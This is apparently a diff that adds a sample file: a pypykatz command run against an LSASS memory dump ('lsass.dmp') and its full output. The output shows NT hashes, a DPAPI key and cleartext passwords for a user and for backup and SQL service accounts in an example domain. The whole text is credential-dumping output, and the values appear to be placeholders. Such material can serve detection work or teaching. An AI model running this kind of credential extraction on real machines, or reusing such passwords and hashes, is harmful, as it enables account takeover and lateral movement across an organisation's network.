@@ -1,0 +1,48 @@
+$ pypykatz lsa minidump lsass.dmp
+INFO:root:Parsing file lsass.dmp
+FILE: ======== lsass.dmp =======
+== LogonSession ==
+authentication_id 1372947 (14f9d3)
+session_id 1
+username jdoe
+domainname EXAMPLE
+logon_server DC01
+logon_time 2026-06-14T08:52:31.145821+00:00
+sid S-1-5-21-3623811015-3361044348-30300820-1001
+luid 1372947
+        == MSV ==
+                Username: jdoe
+                Domain: EXAMPLE
+                LM: NA
+                NT: 64f12cddaa88057e06a81b54e73b949b
+                SHA1: a1b2c3d4e5f60718293a4b5c6d7e8f9012345678
+                DPAPI: 8b7a6f5e4d3c2b1a0918273645abcdef
+        == WDIGEST [14f9d3]==
+                username jdoe
+                domainname EXAMPLE
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: jdoe
+                Domain: EXAMPLE.COM
+        == CREDMAN [14f9d3]==
+                luid 1372947
+                username svc_backup
+                domain fileserver01.example.com
+                password W1nt3r-Backup-2026!
+                password (hex) 570031006e007400330072002d00...
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username svc_sql
+domainname EXAMPLE
+logon_time 2026-06-14T08:50:02.001204+00:00
+sid S-1-5-21-3623811015-3361044348-30300820-1002
+        == MSV ==
+                Username: svc_sql
+                Domain: EXAMPLE
+                NT: e19ccf75ee54e06b06a5907af13cef42
+        == WDIGEST [3e4]==
+                username svc_sql
+                domainname EXAMPLE
+                password S3rver-SQL-2026#Payroll
